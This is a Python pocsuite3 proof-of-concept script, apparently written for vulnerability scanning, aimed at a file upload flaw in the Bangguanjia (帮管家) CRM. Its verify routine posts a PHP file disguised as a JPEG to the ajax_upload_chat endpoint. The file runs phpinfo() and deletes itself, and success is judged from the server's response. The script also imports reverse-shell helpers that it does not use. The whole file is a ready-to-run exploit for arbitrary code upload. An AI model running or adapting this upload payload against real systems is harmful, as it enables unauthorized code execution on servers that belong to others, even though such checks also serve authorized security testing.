# _*_ coding:utf-8 _*_
# @Time : 2024/1/31
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class bangguanjiaCRM_ajax_upload_chat(POCBase):
    pocDesc = '''帮管家 CRM ajax_upload_chat文件上传'''
    author = '炼金术师诸葛亮'
    createDate = '2024-1-31'
    name = '帮管家 CRM ajax_upload_chat文件上传漏洞'
    #app="帮管客-CRM"


    def _verify(self):

        result = {}
        url = self.url+ '/index.php/upload/ajax_upload_chat?type=image'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryv1WbOn5o',
            'Upgrade-Insecure-Requests': '1'
        }
        try:

            data = '------WebKitFormBoundaryv1WbOn5o\r\nContent-Disposition: form-data; name="file"; filename="1.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\nphpinfo();unlink(__FILE__);\r\n------WebKitFormBoundaryv1WbOn5o--'
            response = requests.post(url, headers=headers,data=data)
            if response.status_code == 200 and 'file_name' in response.text:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(bangguanjiaCRM_ajax_upload_chat)
